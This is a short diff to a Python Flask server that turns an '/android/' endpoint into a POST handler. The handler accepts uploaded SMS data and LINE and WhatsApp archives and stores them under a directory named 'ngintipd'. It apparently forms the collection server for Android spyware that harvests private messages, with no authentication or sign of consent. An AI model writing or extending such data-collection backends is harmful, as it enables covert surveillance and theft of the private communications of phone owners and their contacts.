@@ -1,5 +1,6 @@
 #!/usr/bin/env python
-from flask import Flask
+from flask import Flask, request, make_response
+import time
 
 
 app = Flask(__name__)
@@ -11,8 +12,24 @@ def the_root():
     return '\\m/'
 
 
-@app.route('/android/', methods=['GET'])
+@app.route('/android/', methods=['POST'])
 def gather_android():
+    sms = request.form.get('sms')
+    line = request.files.get('line_file')
+    whatsapp = request.files.get('whatsapp_file')
+
+    if not sms or not line or not whatsapp:
+        return make_response('The required fields are not satisfied', 400)
+
+    save_path = '/usr/local/ngintipd/files/'
+    ts = int(time.time())
+
+    with open('%s/%s_sms.json' % (save_path, ts), 'w') as sms_file:
+        sms_file.write(sms)
+
+    line.save('%s/%s_line.tgz' % (save_path, ts))
+    whatsapp.save('%s/%s_whatsapp.tgz' % (save_path, ts))
+
     return 'ok'
 
 
